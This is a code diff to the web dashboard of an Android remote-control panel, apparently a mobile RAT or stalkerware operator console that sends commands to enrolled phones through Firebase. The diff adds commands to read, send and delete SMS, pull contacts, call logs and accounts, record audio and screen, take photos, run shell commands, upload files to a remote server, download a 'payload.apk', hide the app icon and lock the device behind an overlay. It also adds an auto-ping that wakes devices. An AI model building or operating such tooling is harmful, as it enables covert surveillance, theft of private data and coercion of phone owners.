@@ -329,6 +329,7 @@
                     </div>
                     <div id="sidebarAuth" style="margin-top:4px;font-size:10px;word-break:break-all;"></div>
                     <div id="sidebarDeviceCount" style="margin-top:4px;">Devices: —</div>
+                    <div id="sidebarPingStatus" style="margin-top:4px;font-size:10px;color:#5a6070;"></div>
                 </div>
             </nav>
             <div class="sidebar-footer">
@@ -367,8 +368,8 @@
                         <div class="value green" id="dashOnlineDevices">—</div>
                     </div>
                     <div class="status-card">
-                        <div class="label">Status</div>
-                        <div class="value yellow" id="dashFireStatus">Starting…</div>
+                        <div class="label">Ping Watch</div>
+                        <div class="value yellow" id="dashPingStatus">Idle</div>
                     </div>
                 </div>
 
@@ -499,7 +500,7 @@
 
 <script>
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CATALOG
+    //  COMMAND CATALOG  —  FULLY SYNCED WITH CommandExecutor.kt
     // ═══════════════════════════════════════════════════════
     const CAT_NAMES = {
         device: 'Device Control',
@@ -512,39 +513,62 @@
     const COMMANDS = {
         device: [
             { icon: '🔊', name: 'Vibrate', action: 'vibrate', params: { duration: '5000' } },
-            { icon: '🔘', name: 'Click', action: 'click' },
+            { icon: '🔘', name: 'Click', action: 'click', params: { x: '500', y: '1000' } },
             { icon: '⌨️', name: 'Type Text', action: 'type_text', params: { text: 'Hello from C2' } },
-            { icon: '🔄', name: 'Swipe', action: 'swipe', params: { x1: '300', y1: '500', x2: '300', y2: '100' } },
-            { icon: '🔒', name: 'Lock', action: 'lock' },
-            { icon: '💡', name: 'Flashlight', action: 'flashlight' },
+            { icon: '🔄', name: 'Swipe', action: 'swipe', params: { x1: '300', y1: '800', x2: '300', y2: '200' } },
+            { icon: '🔒', name: 'Lock Screen', action: 'lock_screen' },
+            { icon: '💡', name: 'Flashlight', action: 'toggle_flashlight', params: { state: 'on' } },
             { icon: '🔔', name: 'Notification', action: 'notify', params: { title: 'MyControl', body: 'Command received' } },
+            { icon: '💻', name: 'Device Info', action: 'get_device_info' },
+            { icon: '🔋', name: 'Battery Info', action: 'get_battery_info' },
+            { icon: '📶', name: 'Network Info', action: 'get_network_info' },
+            { icon: '🔆', name: 'Set Brightness', action: 'set_brightness', params: { level: '128' } },
+            { icon: '📱', name: 'Find Phone', action: 'find_phone' },
+            { icon: '🌅', name: 'Wake Screen', action: 'wake_screen' },
+            { icon: '🔇', name: 'Mute', action: 'mute' },
         ],
         media: [
-            { icon: '🎤', name: 'Record Audio', action: 'record_audio', params: { duration_sec: '15' } },
-            { icon: '📹', name: 'Record Video', action: 'record_video', params: { duration_sec: '10' } },
-            { icon: '📸', name: 'Camera Snap', action: 'camera_snap' },
+            { icon: '🎤', name: 'Record Audio', action: 'record_audio', params: { duration: '15' } },
+            { icon: '📹', name: 'Record Screen', action: 'record_screen', params: { duration: '30' } },
+            { icon: '📸', name: 'Take Photo', action: 'take_photo' },
             { icon: '📢', name: 'Play Sound', action: 'play_sound', params: { url: 'https://example.com/alert.mp3' } },
-            { icon: '🔊', name: 'Set Volume', action: 'set_volume', params: { level: '0.8' } },
-            { icon: '🔇', name: 'Mute All', action: 'mute' },
+            { icon: '🔊', name: 'Set Volume', action: 'set_volume', params: { level: '80', stream: 'media' } },
+            { icon: '🔇', name: 'Ringer Mode', action: 'set_ringer_mode', params: { mode: 'silent' } },
+            { icon: '💡', name: 'Flashlight Off', action: 'toggle_flashlight', params: { state: 'off' } },
         ],
         files: [
-            { icon: '📸', name: 'Screenshot', action: 'screenshot' },
+            { icon: '📸', name: 'Screenshot', action: 'take_screenshot' },
             { icon: '📋', name: 'Clipboard Get', action: 'clipboard_get' },
-            { icon: '📁', name: 'List Files', action: 'list_files', params: { path: '/sdcard/Download' } },
+            { icon: '📋', name: 'Clipboard Set', action: 'clipboard_set', params: { text: 'pasted from C2' } },
+            { icon: '📁', name: 'List Files', action: 'list_directory', params: { path: '/sdcard/Download' } },
             { icon: '📄', name: 'Read File', action: 'read_file', params: { path: '/sdcard/Download/notes.txt' } },
             { icon: '⬆️', name: 'Upload File', action: 'upload_file', params: { url: 'https://your-server.com/upload', path: '/sdcard/DCIM/photo.jpg' } },
             { icon: '📦', name: 'Download File', action: 'download_file', params: { url: 'https://example.com/payload.apk', path: '/sdcard/Download/payload.apk' } },
         ],
         admin: [
             { icon: '💻', name: 'Run Shell', action: 'run_shell', params: { command: 'id' } },
-            { icon: '📊', name: 'Process List', action: 'ps' },
+            { icon: '📊', name: 'Running Apps', action: 'get_running_apps' },
             { icon: '🗑️', name: 'Kill Process', action: 'kill', params: { pid: '1234' } },
             { icon: '📡', name: 'Ping', action: 'ping' },
             { icon: '🌐', name: 'Open URL', action: 'open_url', params: { url: 'https://example.com' } },
-            { icon: '📞', name: 'Make Call', action: 'make_call', params: { number: '+1234567890' } },
-            { icon: '💬', name: 'Send SMS', action: 'send_sms', params: { number: '+1234567890', message: 'Hello' } },
-            { icon: '🗄️', name: 'Contacts', action: 'get_contacts' },
+            { icon: '📞', name: 'Start Call', action: 'start_call', params: { number: '+1234567890' } },
+            { icon: '💬', name: 'Send SMS', action: 'send_sms', params: { to: '+1234567890', text: 'Hello' } },
+            { icon: '📋', name: 'List SMS', action: 'list_sms', params: { folder: 'inbox' } },
+            { icon: '🗑️', name: 'Delete SMS', action: 'delete_sms', params: { id: '123' } },
+            { icon: '💬', name: 'SMS Threads', action: 'get_sms_threads' },
+            { icon: '📞', name: 'List SIMs', action: 'list_sims' },
+            { icon: '👤', name: 'Contacts', action: 'get_contacts' },
             { icon: '📜', name: 'Call Log', action: 'get_call_log' },
+            { icon: '📱', name: 'Installed Apps', action: 'get_installed_apps' },
+            { icon: '👥', name: 'Accounts', action: 'get_accounts' },
+            { icon: '📶', name: 'Hotspot On', action: 'enable_hotspot' },
+            { icon: '📶', name: 'Hotspot Off', action: 'disable_hotspot' },
+            { icon: '💬', name: 'Show Message', action: 'show_message', params: { text: 'Hello from C2' } },
+            { icon: '❄️', name: 'Freeze', action: 'freeze', params: { text: 'Device locked by admin' } },
+            { icon: '🔥', name: 'Unfreeze', action: 'unfreeze' },
+            { icon: '✏️', name: 'Update Overlay', action: 'update_overlay', params: { text: 'New message' } },
+            { icon: '🙈', name: 'Hide App Icon', action: 'hide_app' },
+            { icon: '👁️', name: 'Show App Icon', action: 'show_app' },
             { icon: '🗺️', name: 'Open Maps', action: 'open_maps', params: { lat: '40.7128', lng: '-74.0060' } },
         ],
         loc: [
@@ -553,9 +577,10 @@
             { icon: '⏹️', name: 'Stop Tracking', action: 'stop_tracking' },
             { icon: '📡', name: 'Cell Towers', action: 'get_cell_towers' },
             { icon: '📶', name: 'WiFi Networks', action: 'get_wifi_networks' },
-            { icon: '🔋', name: 'Battery', action: 'get_battery' },
+            { icon: '🔋', name: 'Battery', action: 'get_battery_info' },
             { icon: '📱', name: 'Device Info', action: 'get_device_info' },
             { icon: '📊', name: 'Sensor Data', action: 'get_sensors' },
+            { icon: '🌐', name: 'Network Info', action: 'get_network_info' },
         ]
     };
 
@@ -577,17 +602,17 @@
     let app = null;
     let db = null;
     let auth = null;
+    let pingTimer = null;
+    let pingCount = 0;
 
     // ═══════════════════════════════════════════════════════
     //  FIREBASE CONFIG — PROPER WEB APP CREDENTIALS
-    //  (from user's registered Web App)
     // ═══════════════════════════════════════════════════════
     function getConfig() {
         const stored = localStorage.getItem('mc_firebase_config');
         if (stored) {
             try {
                 const parsed = JSON.parse(stored);
-                // Validate essential fields exist
                 if (parsed.apiKey && parsed.projectId) return parsed;
             } catch(e) {}
         }
@@ -617,13 +642,10 @@
             app = firebase.initializeApp(cfg);
             db = app.firestore();
             auth = app.auth();
-
-            // Enable offline persistence
             db.settings({ merge: true });
 
             appendDiag('Firebase SDK initialized');
 
-            // Try anonymous auth
             const authTimeout = setTimeout(() => {
                 appendDiag('⏱️ Auth timed out after 15s');
                 document.getElementById('sidebarStatus').innerHTML = '❌ timeout';
@@ -652,6 +674,8 @@
                     setFirebaseStatus('ok', 'online');
                     updateStats();
                     startDeviceListener();
+                    // Start pinging shortly after auth
+                    setTimeout(pingOfflineDevices, 2000);
                 })
                 .catch(err => {
                     clearTimeout(authTimeout);
@@ -712,6 +736,39 @@
     }
 
     // ═══════════════════════════════════════════════════════
+    //  AUTO-PING — sends a ping command to borderline-offline devices
+    //  so they wake up and update lastSeen → dashboard shows online
+    // ═══════════════════════════════════════════════════════
+    function pingOfflineDevices() {
+        if (!firebaseInitialized || !db || state.devices.length === 0) return;
+        const now = Date.now();
+        let pinged = 0;
+        state.devices.forEach(d => {
+            const lastSeen = d.lastSeen || 0;
+            const age = now - lastSeen;
+            // Ping devices that disappeared 30s–10min ago (likely alive)
+            if (age > 30000 && age < 600000) {
+                const cmdId = now + '_' + Math.random().toString(36).slice(2, 8) + '_ping';
+                db.collection('commands').doc(cmdId).set({
+                    deviceId: d.id,
+                    action: 'ping',
+                    params: {},
+                    createdAt: Date.now()
+                }).catch(() => {});
+                pinged++;
+            }
+        });
+        pingCount += pinged;
+        if (pinged > 0) {
+            appendDiag(`⚡ Pinged ${pinged} device(s) to wake up`);
+        }
+        const pingEl = document.getElementById('dashPingStatus');
+        if (pingEl) pingEl.textContent = pinged > 0 ? `Pinging ${pinged}…` : 'Watching';
+        const sidebarPing = document.getElementById('sidebarPingStatus');
+        if (sidebarPing) sidebarPing.textContent = `Pings sent: ${pingCount}`;
+    }
+
+    // ═══════════════════════════════════════════════════════
     //  DEVICE LISTENER
     // ═══════════════════════════════════════════════════════
     function startDeviceListener() {
@@ -738,6 +795,8 @@
                 renderDeviceList();
                 updateStats();
                 document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
+                // After first load, ping devices that look offline
+                pingOfflineDevices();
             }, err => {
                 state.loadingDevices = false;
                 appendDiag('❌ Snapshot error: ' + err.message);
@@ -795,6 +854,7 @@
             updateStats();
             document.getElementById('sidebarDeviceCount').textContent = 'Devices: ' + state.devices.length;
             toast('Found ' + state.devices.length + ' devices', 'success');
+            pingOfflineDevices();
         } catch (e) {
             state.loadingDevices = false;
             toast('Refresh: ' + e.message, 'error');
@@ -840,6 +900,7 @@
                     ? new Date(d.lastSeen).toLocaleString()
                     : 'never';
                 const hasToken = d.fcmToken ? '🔔 Push' : '📴 No FCM';
+                const lastSeenAgo = d.lastSeen ? Math.floor((Date.now() - d.lastSeen) / 1000) + 's ago' : '—';
                 return `
                     <div class="device-card ${online ? 'online' : ''}"
                          onclick="onDeviceTap('${d.id}')"
@@ -854,7 +915,7 @@
                         </div>
                         <div class="dc-name">${d.deviceName || 'Android Device'}</div>
                         <div class="dc-meta">
-                            <span>🕐 ${lastSeen}</span>
+                            <span>🕐 ${lastSeenAgo}</span>
                             <span>${hasToken}</span>
                         </div>
                         <div class="dc-enter">Tap → Command Center</div>
@@ -870,7 +931,7 @@
         const online = state.devices.filter(d => isOnline(d)).length;
         document.getElementById('dashTotalDevices').textContent = total || '0';
         document.getElementById('dashOnlineDevices').textContent = online || '0';
-        document.getElementById('dashLastUpdated').textContent = 'Updated: ' + new Date().toLocaleTimeString();
+        document.getElementById('dashLastUpdated').textContent = 'Online: ' + online + '/' + total + ' | Updated: ' + new Date().toLocaleTimeString();
     }
 
     // ═══════════════════════════════════════════════════════
@@ -948,7 +1009,7 @@
     });
 
     // ═══════════════════════════════════════════════════════
-    //  VIEW SWITCHING
+    //  VIEW SWITCHING  —  with auto-ping on dashboard entry
     // ═══════════════════════════════════════════════════════
     function showView(name) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
@@ -956,6 +1017,20 @@
         document.querySelectorAll('.sidebar-nav a').forEach(a => a.classList.remove('active'));
         const idx = name === 'dashboard' ? 0 : 1;
         document.querySelectorAll('.sidebar-nav a')[idx]?.classList.add('active');
+
+        if (name === 'dashboard') {
+            // Start ping timer: every 15s on dashboard
+            pingOfflineDevices();
+            if (pingTimer) clearInterval(pingTimer);
+            pingTimer = setInterval(pingOfflineDevices, 15000);
+            appendDiag('📋 Dashboard active — ping watch started');
+        } else {
+            if (pingTimer) {
+                clearInterval(pingTimer);
+                pingTimer = null;
+                appendDiag('⏹️ Ping watch stopped');
+            }
+        }
     }
 
     function selectDevice(deviceId) {
@@ -1061,7 +1136,7 @@
                     toast(d.status === 'ok' ? '✓ ' + cmd.name : '✗ ' + cmd.name, d.status === 'ok' ? 'success' : 'error');
                 }
             });
-            setTimeout(() => { updateCmdResult(cmdId, 'error', 'Timeout'); unsub(); }, 30000);
+            setTimeout(() => { updateCmdResult(cmdId, 'error', 'Timeout (30s)'); unsub(); }, 30000);
         } catch (e) {
             updateCmdResult(cmdId, 'error', e.message);
             toast('Failed: ' + e.message, 'error');
